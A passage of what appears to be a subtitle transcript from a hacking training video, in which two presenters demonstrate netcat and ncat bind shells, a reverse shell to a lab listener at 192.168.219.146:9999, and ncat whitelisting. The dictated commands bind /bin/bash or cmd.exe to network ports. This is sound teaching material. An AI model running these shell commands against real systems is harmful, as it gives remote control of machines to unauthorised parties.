--> 00:14:26.800\nYou expose it to the Internet, you've got\nsome of those default ports listening.\n\n297\n00:14:26.800 --> 00:14:29.740\nYou're running a Net-cat server,\nsomebody's gonna find it and\n\n298\n00:14:29.740 --> 00:14:33.150\nhave control of your machine\nbefore you can pull the cord.\n\n299\n00:14:33.150 --> 00:14:34.680\nSo be real careful with that.\n\n300\n00:14:34.680 --> 00:14:35.900\n&gt;&gt; Yeah, yeah.\n\n301\n00:14:35.900 --> 00:14:39.180\nAll right, that being said,\nwarning aside now that you know, and\n\n302\n00:14:39.180 --> 00:14:44.245\nknowing is half the battle,\nthe other half is violence, I hear.\n\n303\n00:14:44.245 --> 00:14:45.440\n[LAUGH] So let's move forward.\n\n304\n00:14:45.440 --> 00:14:47.505\nSo now I've got my correct IP address,\n\n305\n00:14:47.505 --> 00:14:50.015\nI will bring up my Net-cat listener yet\nagain.\n\n306\n00:14:50.015 --> 00:14:52.740\nNc-n-\n&gt;&gt; I think you paused it.\n\n307\n00:14:52.740 --> 00:14:53.340\nIs it still running?\n\n308\n00:14:53.340 --> 00:14:54.500\n&gt;&gt; 9999, no, it's good, I killed it.\n\n309\n00:14:54.500 --> 00:14:55.120\n&gt;&gt; Okay.\n&gt;&gt; Yeah.\n\n310\n00:14:55.120 --> 00:14:56.130\n&gt;&gt; Okay.\n&gt;&gt; But thanks for\n\n311\n00:14:56.130 --> 00:14:57.740\nthe heads up, cuz that could've happened.\n\n312\n00:14:57.740 --> 00:15:00.680\nIt would have just spawned another one,\nso not a bit deal.\n\n313\n00:15:00.680 --> 00:15:01.920\nSo, there we go, hit Enter.\n\n314\n00:15:01.920 --> 00:15:05.278\nListing on 9999,\nI am able to go back a little too far.\n\n315\n00:15:05.278 --> 00:15:10.514\nAnd say, 192.168.219.146 was the IP.\n\n316\n00:15:10.514 --> 00:15:14.960\nAnd then, what port was it on,\nit was on 9999.\n\n317\n00:15:14.960 --> 00:15:16.520\nIt's my favorite thing\nin the world to forget.\n\n318\n00:15:16.520 --> 00:15:19.530\nI'll probably do it umpteen\ntimes in this series.\n\n319\n00:15:19.530 --> 00:15:22.400\nAnd it'll yell at me,\nno port specified, idiot!\n\n320\n00:15:22.400 --> 00:15:22.950\nUse a port!\n\n321\n00:15:22.950 --> 00:15:26.580\nThere we go, hit Return and\nnow we have a connection.\n\n322\n00:15:27.775 --> 00:15:30.505\nNot a whole lot going on here.\n\n323\n00:15:30.505 --> 00:15:31.378\nCool thing is, though,\n\n324\n00:15:31.378 --> 00:15:33.714\nI think at this point it's basically\nlike a chat session, right?\n\n325\n00:15:33.714 --> 00:15:34.609\nIf I say hi, there.\n\n326\n00:15:34.609 --> 00:15:37.155\nCan we go back to the Linux box?\n\n327\n00:15:37.155 --> 00:15:39.805\nYou'll notice it says hi, there.\n\n328\n00:15:39.805 --> 00:15:42.205\nRight there.\n\n329\n00:15:42.205 --> 00:15:42.895\n&gt;&gt; Sweet.\n\n330\n00:15:42.895 --> 00:15:45.355\n&gt;&gt; So easy way to build up a little\nchat room for yourself, right?\n\n331\n00:15:45.355 --> 00:15:48.365\nAnybody that wants to connect can connect,\nuse Net-cat to do that.\n\n332\n00:15:48.365 --> 00:15:51.669\nNot really what we're trying to do\nhere even though it's kinda cool.\n\n333\n00:15:51.669 --> 00:15:56.283\nWhat we wanna do is we wanna create\nbind shells and reverse shells.\n\n334\n00:15:56.283 --> 00:15:59.220\nBut we needed to know how to\ncreate a connection first.\n\n335\n00:15:59.220 --> 00:16:01.137\nSo that's what we did,\nthat's why we're here.\n\n336\n00:16:01.137 --> 00:16:03.377\nLet's start there.\n\n337\n00:16:03.377 --> 00:16:05.502\nLet's go with a bind shell.\n\n338\n00:16:05.502 --> 00:16:09.230\nLet's talk about what a bind shell is and\nwhat we mean.\n\n339\n00:16:09.230 --> 00:16:15.080\nSo basically what I'm doing is I'm opening\nthat port and I'm binding my shell.\n\n340\n00:16:15.080 --> 00:16:16.830\nSo if I'm in a Bash environment,\nI'm binding that.\n\n341\n00:16:16.830 --> 00:16:21.591\nIf I'm in a Windows environment,\nI'm binding that cmd.exe,\n\n342\n00:16:21.591 --> 00:16:27.950\nblackbox command prompt to netcat, so that\nwhen I fire up netcat, you get the shell.\n\n343\n00:16:29.230 --> 00:16:30.450\nVery cool right?\n\n344\n00:16:30.450 --> 00:16:31.650\nLet's see how that works.\n\n345\n00:16:32.860 --> 00:16:35.640\nLet's kill this connection because\nwe have to make some changes here.\n\n346\n00:16:35.640 --> 00:16:39.114\nActually I think I can leave this one\nopen but we'll do it from scratch just so\n\n347\n00:16:39.114 --> 00:16:40.870\nyou can see it without encumbrance.\n\n348\n00:16:40.870 --> 00:16:46.843\nLet's see here, just hit control+c\nto kill your netcat connections.\n\n349\n00:16:46.843 --> 00:16:47.913\nVery simple.\n\n350\n00:16:47.913 --> 00:16:52.470\nAnd that's on both Windows and\nLinux environments.\n\n351\n00:16:52.470 --> 00:16:54.320\nSo now that should be killed,\nit's killed over here.\n\n352\n00:16:55.370 --> 00:17:00.338\nSo what I want to do is\nI'll say nc-nlvp and\n\n353\n00:17:00.338 --> 00:17:03.104\nthen my port 9999.\n\n354\n00:17:03.104 --> 00:17:08.710\nAnd I'll say -e/bin/bash,\ncuz I'm in a BASH environment.\n\n355\n00:17:08.710 --> 00:17:10.380\nThat's the shell that I have.\n\n356\n00:17:10.380 --> 00:17:13.070\nIf I have access to other\nshells I can use those as well.\n\n357\n00:17:13.070 --> 00:17:15.290\nI like Bash, I don't know about y'all.\n\n358\n00:17:15.290 --> 00:17:19.100\nGo crazy with whatever you like, but\nI'm typically in a bash environment so\n\n359\n00:17:19.100 --> 00:17:21.160\nthat's where I'm going to bind.\n\n360\n00:17:21.160 --> 00:17:25.130\nI'm binding that to the netcat\nlistener and the port that that's on.\n\n361\n00:17:25.130 --> 00:17:27.360\nThat's why we call it a bind shell.\n\n362\n00:17:27.360 --> 00:17:31.390\nNow anybody that makes a connection\nshould get a bash shell.\n\n363\n00:17:31.390 --> 00:17:33.110\nLet's see if that happens.\n\n364\n00:17:33.110 --> 00:17:35.220\nListening on any ports.\n\n365\n00:17:35.220 --> 00:17:36.930\nOn our client side, no different.\n\n366\n00:17:36.930 --> 00:17:40.018\nWe're just saying,\nmake a connection to this netcat listener.\n\n367\n00:17:42.087 --> 00:17:43.900\nAnd there we go.\n\n368\n00:17:43.900 --> 00:17:45.220\nAnd it's giving me some issues.\n\n369\n00:17:45.220 --> 00:17:45.950\nLet's see here.\n\n370\n00:17:45.950 --> 00:17:46.910\nWhat is my problem?\n\n371\n00:17:47.960 --> 00:17:50.118\nWhat did I do?\n\n372\n00:17:50.118 --> 00:17:56.040\nI did -e, that should be working.\n\n373\n00:17:56.040 --> 00:17:57.260\nWhy is that not happening?\n\n374\n00:17:57.260 --> 00:17:58.630\nI do see that I have a connection.\n\n375\n00:17:59.650 --> 00:18:05.243\nLVP-e, bin bash, yeah, all that's working.\n\n376\n00:18:05.243 --> 00:18:07.924\nSo why did I not get a shell?\n\n377\n00:18:07.924 --> 00:18:09.750\nThat's a very good question my man.\n\n378\n00:18:11.280 --> 00:18:16.285\nYou know what, sometimes, yeah,\nI actually do have a shell.\n\n379\n00:18:16.285 --> 00:18:17.930\n&gt;&gt; [LAUGH].\nThat'll drive you crazy.\n\n380\n00:18:17.930 --> 00:18:19.990\n&gt;&gt; Woah, there for a second.\n\n381\n00:18:19.990 --> 00:18:25.050\nThis is actually a really good\nlearning time right here.\n\n382\n00:18:25.050 --> 00:18:26.910\nPut on your thinking cap.\n\n383\n00:18:26.910 --> 00:18:31.460\nA lot of times, you'll be doing something\nhere in your hacking environment.\n\n384\n00:18:31.460 --> 00:18:32.830\nI'm hacking stuff and\n\n385\n00:18:32.830 --> 00:18:36.260\nwe get exactly what we just saw right\nhere, didn't look like anything happened.\n\n386\n00:18:36.260 --> 00:18:40.020\nIt even fooled me and I know better,\nbecause I was expecting\n\n387\n00:18:40.020 --> 00:18:44.035\nto see- I'm used to working with something\nthat gives me a returned output.\n\n388\n00:18:44.035 --> 00:18:47.790\nThat I forget when you're doing this type\nof environment that you have to have made\n\n389\n00:18:47.790 --> 00:18:50.970\nit do, and I didn't do that,\nI just made a very simple connection.\n\n390\n00:18:54.060 --> 00:18:56.760\nSo don't just assume that it didn't\nwork because you don't see what you\n\n391\n00:18:56.760 --> 00:18:58.220\nexpected to see.\n\n392\n00:18:58.220 --> 00:19:02.640\nMake sure that things\nare moving forward or not.\n\n393\n00:19:02.640 --> 00:19:08.110\nSo if you try to create a reverse\nshell and nothing happens, make sure,\n\n394\n00:19:08.110 --> 00:19:11.260\nhit the enter key a couple times, type\nin a command, see if it does anything,\n\n395\n00:19:11.260 --> 00:19:15.120\nbecause you'll notice that\nthe connection was made, I knew that.\n\n396\n00:19:15.120 --> 00:19:17.310\nFollow your logic, follow your reasoning.\n\n397\n00:19:17.310 --> 00:19:19.750\nThat's where you need to\nbe inside your headspace.\n\n398\n00:19:19.750 --> 00:19:23.920\nWell, I started the listener,\nthat's right.\n\n399\n00:19:23.920 --> 00:19:27.800\nI bound the thing to the port,\nI bound the shell to the port.\n\n400\n00:19:27.800 --> 00:19:28.610\nI create a connection.\n\n401\n00:19:28.610 --> 00:19:31.610\nIt says a connection was made,\nand that was my key.\n\n402\n00:19:31.610 --> 00:19:32.930\nThis is how you need to think.\n\n403\n00:19:34.130 --> 00:19:38.370\nLook for the, the devil is in the details\nwhen it comes to this business.\n\n404\n00:19:38.370 --> 00:19:39.540\nSo look for subtlety.\n\n405\n00:19:39.540 --> 00:19:43.980\nTake your time,\ndon't assume anything and verify.\n\n406\n00:19:43.980 --> 00:19:45.110\nTrust but verify.\n\n407\n00:19:45.110 --> 00:19:49.415\nThese are the guiding stars that\nwill keep you on the right path and\n\n408\n00:19:49.415 --> 00:19:50.745\ngets you inside of the boxes.\n\n409\n00:19:50.745 --> 00:19:55.480\nCuz I can't tell you how many times I\noverlooked a subtle little thing and\n\n410\n00:19:55.480 --> 00:19:58.150\nI had the key to the kingdom right\nin my hand and i overlooked it.\n\n411\n00:19:58.150 --> 00:20:01.330\nI had to go back, why isn't this working?\n\n412\n00:20:01.330 --> 00:20:04.230\nYou will spend days and\nnights in frustrations\n\n413\n00:20:04.230 --> 00:20:08.160\ntrying to figure out what that key is,\nbut stick to it and you will find it.\n\n414\n00:20:08.160 --> 00:20:12.010\nAnd when you do, you will jump for\njoy like nobody's business, it is so\n\n415\n00:20:12.010 --> 00:20:14.590\nmuch fun to get into that stuff.\n\n416\n00:20:14.590 --> 00:20:17.000\nSo that's a good, I did get in there.\n\n417\n00:20:17.000 --> 00:20:18.915\n&gt;&gt; Can you show us what you did there,\nDan?\n\n418\n00:20:18.915 --> 00:20:23.074\nJust scroll back up and just show us the\nprompt, cuz it really didn't look like you\n\n419\n00:20:23.074 --> 00:20:26.050\nhad a shell but I think you\nfired a command and got results.\n\n420\n00:20:26.050 --> 00:20:26.680\n&gt;&gt; Yeah, it did, that's it.\n\n421\n00:20:26.680 --> 00:20:28.310\nI hit the enter key a couple times.\n\n422\n00:20:28.310 --> 00:20:29.170\nI didn't see anything.\n\n423\n00:20:29.170 --> 00:20:33.720\nSometimes that will prompt the prompt to\nshow up like that c:$, whatever it is.\n\n424\n00:20:33.720 --> 00:20:38.800\nOr this was bin bash to give me that\nroot@colley hash sign kind of thing.\n\n425\n00:20:38.800 --> 00:20:41.520\nThat's what I was looking for and\nI didn't see it so it threw me off.\n\n426\n00:20:41.520 --> 00:20:43.360\nBut I actually had made the connection.\n\n427\n00:20:43.360 --> 00:20:46.090\nSo hit enter key a couple times,\nnothing happened.\n\n428\n00:20:46.090 --> 00:20:49.390\nI said well let me try to throw\na command at it and see what it does.\n\n429\n00:20:49.390 --> 00:20:50.720\nThat's again, that's the mindset.\n\n430\n00:20:50.720 --> 00:20:51.650\nSee what these things'll do.\n\n431\n00:20:51.650 --> 00:20:55.330\nNot only what it's designed to do,\nbut what you can make it do.\n\n432\n00:20:55.330 --> 00:20:57.730\nSo I threw ls at it and\nit listed the files.\n\n433\n00:20:57.730 --> 00:21:02.660\nI can do it a little easier with ls-al and\nnow it looks a little more\n\n434\n00:21:03.900 --> 00:21:07.230\nlike, yeah, I'm in a system,\nI'm remotely connected to the Linux.\n\n435\n00:21:07.230 --> 00:21:10.420\nI'm in Windows right now,\nthat is my Linux box.\n\n436\n00:21:10.420 --> 00:21:14.250\nI have control over it,\nI am logged in, that's a bind shell.\n\n437\n00:21:14.250 --> 00:21:16.160\nLet's do it the opposite way, all right?\n\n438\n00:21:16.160 --> 00:21:19.670\nSo let's Ctrl+C, you'll notice that\nthat's killed over here as well.\n\n439\n00:21:19.670 --> 00:21:21.980\nSo if one kills, the other kills.\n\n440\n00:21:21.980 --> 00:21:23.750\nNetcat only likes one connection.\n\n441\n00:21:23.750 --> 00:21:27.414\nWe create a connection,\nit loves that connection until it's dead,\n\n442\n00:21:27.414 --> 00:21:29.760\nonce it's dead, it stops its processes.\n\n443\n00:21:29.760 --> 00:21:34.658\nSo let's do that the opposite way,\nlet's setup\n\n444\n00:21:34.658 --> 00:21:39.922\nthe server here nc.exe-nvlp\nsame type of syntax.\n\n445\n00:21:39.922 --> 00:21:44.857\nLet's see here,\nwe'll put that on port 9999,\n\n446\n00:21:44.857 --> 00:21:51.260\njust like we did before, and\nwe will -e cmd.exe, just like that.\n\n447\n00:21:52.670 --> 00:21:59.650\nReturn, listening,\ngo over to my Linux connection, nc-mv.\n\n448\n00:21:59.650 --> 00:22:01.170\nWhat is its IP address?\n\n449\n00:22:01.170 --> 00:22:04.100\nThat is a good question and\nI can't do the old or\n\n450\n00:22:04.100 --> 00:22:06.520\nhave foreground background\nstuff on Windows.\n\n451\n00:22:06.520 --> 00:22:08.239\nLet's open up another prompt.\n\n452\n00:22:08.239 --> 00:22:11.007\nIt is .168.\n\n453\n00:22:11.007 --> 00:22:12.243\nThere we go.\n\n454\n00:22:12.243 --> 00:22:17.620\nSo 102 168.2190 168, that's funny.\n\n455\n00:22:17.620 --> 00:22:21.585\nAnd on port 9999, ready connection.\n\n456\n00:22:21.585 --> 00:22:25.615\nThis time I did get a user prompt so\nit popped it over for me.\n\n457\n00:22:25.615 --> 00:22:30.125\nHere I know for a fact I have made\na good connection, I am in that system.\n\n458\n00:22:30.125 --> 00:22:37.220\nYou see the prompt changed\nfrom route@kali to c$ users.\n\n459\n00:22:37.220 --> 00:22:41.020\nThat's not on Linux, ladies and\ngentlemen, that's a Windows machine and\n\n460\n00:22:41.020 --> 00:22:45.750\nI can start dir'ing and\ncd.., all of that stuff and\n\n461\n00:22:45.750 --> 00:22:48.780\nI start moving through I now have\na connection to that machine.\n\n462\n00:22:48.780 --> 00:22:52.110\nThis is great for firewalls and\nthings of that nature, or\n\n463\n00:22:52.110 --> 00:22:55.150\nyou need someone to remote in and\ntake a look at something.\n\n464\n00:22:55.150 --> 00:22:57.040\nYou can create a bind shell really easily.\n\n465\n00:22:58.120 --> 00:22:59.040\nI mentioned firewall,\n\n466\n00:22:59.040 --> 00:23:02.870\nsometimes the firewall will be\nblocking those incoming connections.\n\n467\n00:23:03.880 --> 00:23:10.100\nSo the person on the outside will have\nto maybe pump their connection into,\n\n468\n00:23:10.100 --> 00:23:13.180\nor the other way around should I say, cuz\ndepending on what the firewall's doing.\n\n469\n00:23:13.180 --> 00:23:16.580\nFirewall's blocking incoming connections,\nyou need to push it out,\n\n470\n00:23:16.580 --> 00:23:20.590\nif they're blocking outgoing connections,\nyou need to pipe it in.\n\n471\n00:23:20.590 --> 00:23:23.120\nSo just keep that in mind, and\nthat's the difference between the bind and\n\n472\n00:23:23.120 --> 00:23:24.050\nreverse shell.\n\n473\n00:23:24.050 --> 00:23:30.240\nThe bind says I am listening,\nI am bound to this cmd.exe or\n\n474\n00:23:30.240 --> 00:23:33.600\nbin bash, or whatever, and\nany connection comes in gets that.\n\n475\n00:23:33.600 --> 00:23:38.600\nThe other way is send me your connection.\n\n476\n00:23:38.600 --> 00:23:43.340\nI know it's weird, it's tricky, but you've\ngot to get that straight in your head.\n\n477\n00:23:43.340 --> 00:23:45.990\nThat instead of I'm\ngoing to connect to you,\n\n478\n00:23:45.990 --> 00:23:49.790\nit's you're gonna push\nyour connection to me.\n\n479\n00:23:49.790 --> 00:23:51.750\nThe end result is the same.\n\n480\n00:23:51.750 --> 00:23:54.508\nThere's no difference in the way it works,\nwhen it's all said and done.\n\n481\n00:23:54.508 --> 00:23:56.455\nIt's just how it's pushed.\n\n482\n00:23:56.455 --> 00:23:57.688\nSo a reverse shell,\n\n483\n00:23:57.688 --> 00:24:01.752\nsays instead of me connecting to\nyou I'm gonna start a listener and\n\n484\n00:24:01.752 --> 00:24:06.485\nyou're gonna push your connection to me,\nright, that's the difference.\n\n485\n00:24:06.485 --> 00:24:08.204\nSo let's exit out of here.\n\n486\n00:24:08.204 --> 00:24:13.425\nYou'll notice I hit exit, that killed\nthe command prompt over here for that.\n\n487\n00:24:13.425 --> 00:24:15.562\nYou'll notice it stopped here as well.\n\n488\n00:24:15.562 --> 00:24:20.910\nVery cool, cuz that's a legitimate\ncommand prompt command.\n\n489\n00:24:20.910 --> 00:24:24.260\nSo now let's do a reverse shell,\nwhat does that look like?\n\n490\n00:24:24.260 --> 00:24:25.992\nSo creating up a reverse shell,\nlet me see here.\n\n491\n00:24:28.326 --> 00:24:32.337\nI'm doing the same thing\nexcept on the client side is\n\n492\n00:24:32.337 --> 00:24:35.800\nwhere I'm gonna bind that shell, right?\n\n493\n00:24:35.800 --> 00:24:38.020\nBefore we were binding\nthe shell to the listener.\n\n494\n00:24:38.020 --> 00:24:40.840\nNow we're binding the shell to the client.\n\n495\n00:24:40.840 --> 00:24:43.200\nSo that should help you keep\n\n496\n00:24:43.200 --> 00:24:45.730\nthe difference between\nbind versus reverse, okay.\n\n497\n00:24:45.730 --> 00:24:47.343\nReverse shell binds to the client.\n\n498\n00:24:47.343 --> 00:24:50.524\nBind shell binds to the listener,\nall right.\n\n499\n00:24:50.524 --> 00:24:56.329\nSo let's do that,\nlet's create a listener, nc -nlvp 9999.\n\n500\n00:24:56.329 --> 00:24:58.024\nVery simple.\n\n501\n00:24:58.024 --> 00:25:00.843\nListening, I come over\nhere to my clients and\n\n502\n00:25:00.843 --> 00:25:04.490\nI say nc., I think I can leave\nthe .exe off, let's see.\n\n503\n00:25:04.490 --> 00:25:11.928\n/nv2192.168.219.146 on\n\n504\n00:25:11.928 --> 00:25:16.038\nport 9999 and -e for\n\n505\n00:25:16.038 --> 00:25:20.152\nexecute/ or cmd.exe.\n\n506\n00:25:20.152 --> 00:25:22.990\nAnd now look at that.\n\n507\n00:25:22.990 --> 00:25:24.300\nSo we did the reverse, right?\n\n508\n00:25:24.300 --> 00:25:27.700\nWe used the client side to\nsay we'll reverse that shell.\n\n509\n00:25:27.700 --> 00:25:29.470\nThis is known as shell shoveling.\n\n510\n00:25:29.470 --> 00:25:33.130\nI'm shoveling the shell to you,\nright, here it is.\n\n511\n00:25:33.130 --> 00:25:36.570\nInstead of hey, that's a nice shell you\ngot there, let me connect to that, right?\n\n512\n00:25:36.570 --> 00:25:39.387\nSo I know I'm banging this drum but\nit's for a very good reason.\n\n513\n00:25:41.327 --> 00:25:44.060\nLet's see here, so\nthat's bind shells, reverse shells.\n\n514\n00:25:44.060 --> 00:25:50.260\nI do also wanna show you,\nyou saw ncat, which is very cool.\n\n515\n00:25:50.260 --> 00:25:53.230\nBasically works just like netcat.\n\n516\n00:25:53.230 --> 00:26:00.870\nI think it is an update to netcat,\nand it adds some features to that.\n\n517\n00:26:00.870 --> 00:26:04.222\nOne of them being encryption and\nthe other being whitelisting.\n\n518\n00:26:04.222 --> 00:26:07.570\nSo where we were talking about earlier\nwhere if you open up a listener on netcat,\n\n519\n00:26:07.570 --> 00:26:10.110\nanybody that knows that port is open and\nit's sitting there waiting for\n\n520\n00:26:10.110 --> 00:26:12.040\na connection, they can connect to it.\n\n521\n00:26:12.040 --> 00:26:15.030\nAnd it'll say, great, I got a connection.\n\n522\n00:26:15.030 --> 00:26:17.158\nIt doesn't discern what's happening.\n\n523\n00:26:17.158 --> 00:26:20.562\nYou would have to use a firewall or\nsomething to stop connections from\n\n524\n00:26:20.562 --> 00:26:24.330\nhappening, where ncat will allow you\nto do that in its command line itself.\n\n525\n00:26:25.400 --> 00:26:27.160\nSo let's take a look here.\n\n526\n00:26:27.160 --> 00:26:31.300\nWorks very much like\nnetcat in its verbiage.\n\n527\n00:26:31.300 --> 00:26:33.638\nIt's the way we use the syntax,\nshould I say.\n\n528\n00:26:33.638 --> 00:26:35.819\nLet me exit from here.\n\n529\n00:26:35.819 --> 00:26:37.630\nI think that's killed that there, great.\n\n530\n00:26:38.860 --> 00:26:39.670\nSo let's do this.\n\n531\n00:26:39.670 --> 00:26:41.331\nLet's try a bind shell.\n\n532\n00:26:41.331 --> 00:26:46.082\nWe'll say ncat here,\nI think you can still use e,\n\n533\n00:26:46.082 --> 00:26:49.490\nif not it's --exec, like that.\n\n534\n00:26:49.490 --> 00:26:52.250\nI'm gonna try -e just for fun.\n\n535\n00:26:52.250 --> 00:26:56.764\nAnd we'll say, what do I gotta do?\n\n536\n00:26:56.764 --> 00:26:58.168\nI guess set up the listener, right.\n\n537\n00:26:58.168 --> 00:27:02.128\nThis is -bin/bash,\nI'm getting twisted around.\n\n538\n00:27:02.128 --> 00:27:03.890\nI've got so many machines going on.\n\n539\n00:27:03.890 --> 00:27:05.180\nWhere am I at, what am I doing?\n\n540\n00:27:06.260 --> 00:27:10.580\n/bin/bash and we'll say -vln.\n\n541\n00:27:10.580 --> 00:27:12.170\nSame kind of idea, right?\n\n542\n00:27:12.170 --> 00:27:15.080\nVerbosity, listen and no DNS.\n\n543\n00:27:16.420 --> 00:27:20.376\nAnd then you can just tell it\nwhich port to listen to, so 9999.\n\n544\n00:27:20.376 --> 00:27:24.100\nHit Return, and\nnotice that it's listening.\n\n545\n00:27:24.100 --> 00:27:26.875\nCool thing is I can use netcat\nto connect to it, cuz netcat,\n\n546\n00:27:26.875 --> 00:27:28.690\n[LAUGH] it loves connections, right?\n\n547\n00:27:28.690 --> 00:27:32.671\nI can do that.\nOr I can use ncat to connect as well,\n\n548\n00:27:32.671 --> 00:27:36.860\nwhich is just -v and then whatever.\n\n549\n00:27:36.860 --> 00:27:39.470\nAgain, I like verbosity,\nwhatever the machine is.\n\n550\n00:27:40.920 --> 00:27:42.077\nI'm totally messing that up.\n\n551\n00:27:42.077 --> 00:27:47.882\n.168.219.146 on port 9999.\n\n552\n00:27:47.882 --> 00:27:51.306\nThere we go, I'm connected, -al.\n\n553\n00:27:51.306 --> 00:27:53.930\nThere we go, I made a connection,\njust as simple.\n\n554\n00:27:53.930 --> 00:27:54.730\nLet's talk about the cool stuff.\n\n555\n00:27:54.730 --> 00:27:56.720\nLet's do the cool stuff instead.\n\n556\n00:27:56.720 --> 00:27:58.645\nAnybody can make a connection,\nlet's do the neat stuff.\n\n557\n00:27:58.645 --> 00:28:00.548\nSo exit out of this.\n\n558\n00:28:00.548 --> 00:28:04.020\nAnd let's see here.\n\n559\n00:28:04.020 --> 00:28:10.100\nCreate our listener,\nlet's set that up, ncats.\n\n560\n00:28:10.100 --> 00:28:10.900\nLet's see here.\n\n561\n00:28:10.900 --> 00:28:12.679\nIt also does reverse shells,\nas well, so don't forget that.\n\n562\n00:28:12.679 --> 00:28:16.740\nIt does anything netcat can do, but\nwe wanna give you the whitelisting.\n\n563\n00:28:16.740 --> 00:28:17.535\nLet's do that first.\n\n564\n00:28:17.535 --> 00:28:23.260\nLet's say --exec, by the way, that -e\ndid work, so sweet, I will use that.\n\n565\n00:28:23.260 --> 00:28:24.288\nThat's a lot less typing.\n\n566\n00:28:24.288 --> 00:28:31.185\nCmd, all right,\nwe need to do this on, yeah -eos.\n\n567\n00:28:31.185 --> 00:28:33.007\n/bin/bash.\n\n568\n00:28:33.007 --> 00:28:34.110\nI'm so twisted around.\n\n569\n00:28:34.110 --> 00:28:36.630\nI'm trying to keep everything straight for\nyou guys.\n\n570\n00:28:36.630 --> 00:28:38.627\n&gt;&gt; [LAUGH]\n&gt;&gt; And then,\n\n571\n00:28:38.627 --> 00:28:40.280\nthat's why I wrote these down, Mike.\n\n572\n00:28:40.280 --> 00:28:41.908\nI was smart.\n[CROSSTALK]\n\n573\n00:28:41.908 --> 00:28:43.604\n&gt;&gt; Yeah, [LAUGH] it can be extremely,\n\n574\n00:28:43.604 --> 00:28:47.055\nwhat's the word for it, confusing,\nwhen you start playing around,\n\n575\n00:28:47.055 --> 00:28:50.506\nespecially when you're flipping\nfrom one environment to the other,\n\n576\n00:28:50.506 --> 00:28:52.570\ndoing some shells by, and some reverse.\n\n577\n00:28:52.570 --> 00:28:55.240\nI'm like, wait,\nwhich end am I on right now?\n\n578\n00:28:55.240 --> 00:28:57.410\nBut that's why you're taking your time and\n\n579\n00:28:57.410 --> 00:29:01.160\ndocumenting everything you do, extremely\nimportant as you go through this.\n\n580\n00:29:02.250 --> 00:29:04.240\n&gt;&gt; All right,\nI think that should be good to go.\n\n581\n00:29:04.240 --> 00:29:09.067\nSo I'm saying, bind that\n/bin/bash shell to port 9999, and\n\n582\n00:29:09.067 --> 00:29:13.838\nonly allow connections\nfrom 192.168.219.168.\n\n583\n00:29:13.838 --> 00:29:17.130\nThat's whitelisting, basically,\nthese are the only allowed ones.\n\n584\n00:29:17.130 --> 00:29:21.647\nHit Return, of course,\nI must find a host to connect to.\n\n585\n00:29:21.647 --> 00:29:23.783\nMy.\n\n586\n00:29:26.592 --> 00:29:29.413\nThat is allow, I think,\nhere's what I did wrong.\n\n587\n00:29:29.413 --> 00:29:32.490\nLet me move this around just a bit.\n\n588\n00:29:36.031 --> 00:29:39.969\n-v 9999, let's try that.\n\n589\n00:29:39.969 --> 00:29:42.360\nMust supply a host, what did I type wrong?\n\n590\n00:29:43.650 --> 00:29:48.270\nI typically use netcat, this is why\nI'm struggling here just for a second.\n\n591\n00:29:48.270 --> 00:29:50.100\nLet's see here, let's start from scratch.\n\n592\n00:29:52.306 --> 00:29:56.207\nSo it's ncats --exec.\n\n593\n00:29:56.207 --> 00:29:59.005\nWhoa, apparently I got a little\ncrazy with the mouse here.\n\n594\n00:29:59.005 --> 00:30:01.687\nI touched it with my thumb.\n\n595\n00:30:01.687 --> 00:30:02.685\nThere we go.\n\n596\n00:30:02.685 --> 00:30:04.381\nThank you.\n\n597\n00:30:04.381 --> 00:30:12.147\n--exec, and it will be /bin/bash --allow,\n\n598\n00:30:12.147 --> 00:30:19.192\nand it will be 192.168.219.1,\n\n599\n00:30:19.192 --> 00:30:26.067\nwhat was it, 68 and then on port 9999.\n\n600\n00:30:26.067 --> 00:30:27.971\nThat should be right.\n\n601\n00:30:27.971 --> 00:30:34.090\nOkay, I think I may have found\nthe problem here, overlooking things.\n\n602\n00:30:34.090 --> 00:30:37.810\nThat's the problem, you get in a hurry and\nthen it all goes to heck, right?\n\n603\n00:30:37.810 --> 00:30:41.830\nSo I think the problem was because\nI wasn't putting dash the vnl.\n\n604\n00:30:41.830 --> 00:30:45.460\nI gotta set up the actually, yeah-\n&gt;&gt; Yeah, sometimes that helps.\n\n605\n00:30:45.460 --> 00:30:47.285\n&gt;&gt; It helps, it helps, yeah.\n\n606\n00:30:47.285 --> 00:30:48.505\n&gt;&gt; Basically turning on the listener.\n\n607\n00:30:48.505 --> 00:30:51.337\n&gt;&gt; Yeah, kinda turning the listener\non will probably help us out here.\n\n608\n00:30:51.337 --> 00:30:54.737\n192 [INAUDIBLE] 9999,\njust do it the old fashioned way.\n\n609\n00:30:54.737 --> 00:30:59.255\nI was getting discombulated, you can\nthrow these commands around each other.\n\n610\n00:30:59.255 --> 00:31:02.485\nAnd the way I wrote it in my notes was\ndifferent than the way I was thinking of\n\n611\n00:31:02.485 --> 00:31:04.070\nit in my head which was messing me up.\n\n612\n00:31:04.070 --> 00:31:08.280\nSo let's do it with consistency,\nLowrie, that's the best way to go.\n\n613\n00:31:08.280 --> 00:31:13.656\nSo whitelisting now we can say --allow,\nlike that, and\n\n614\n00:31:13.656 --> 00:31:20.260\nthen let's say 192.168.219.168,\nI believe it was.\n\n615\n00:31:20.260 --> 00:31:21.745\nYeah, that should be it.\n\n616\n00:31:21.745 --> 00:31:24.495\n&gt;&gt; --x.\n&gt;&gt; Yeah, we're gonna bind a shell so-\n\n617\n00:31:24.495 --> 00:31:27.999\n&gt;&gt; -bin/bash.\n\n618\n00:31:27.999 --> 00:31:30.400\nI don't know if that has\nto be flipped around.\n\n619\n00:31:30.400 --> 00:31:32.990\nAgain, they allow a lot of flipping\nof commands wherever you want.\n\n620\n00:31:32.990 --> 00:31:34.440\n&gt;&gt; But only certain ones sometimes.\n\n621\n00:31:34.440 --> 00:31:35.600\nSometimes it gives you an error.\n\n622\n00:31:35.600 --> 00:31:37.700\nAnd you're like, wait, come on.\n\n623\n00:31:37.700 --> 00:31:39.356\n&gt;&gt; It can get frustrating to be\nhonest with you, ladies and gents.\n\n624\n00:31:39.356 --> 00:31:42.735\n[COUGH] Sorry about that.\n\n625\n00:31:42.735 --> 00:31:43.315\nSo there we go.\n\n626\n00:31:43.315 --> 00:31:45.440\nWe got the listener going,\neverything's good.\n\n627\n00:31:45.440 --> 00:31:48.585\nAnd we gotta make sure you just keep\neverything in the right order or\n\n628\n00:31:48.585 --> 00:31:50.955\nwhatever allowed order,\nit'll allow you to do.\n\n629\n00:31:50.955 --> 00:31:53.780\nAll right, let's jump over to my computer.\n\n630\n00:31:53.780 --> 00:31:56.274\nAnd I just realized this does\nlook a little small for you guys.\n\n631\n00:31:56.274 --> 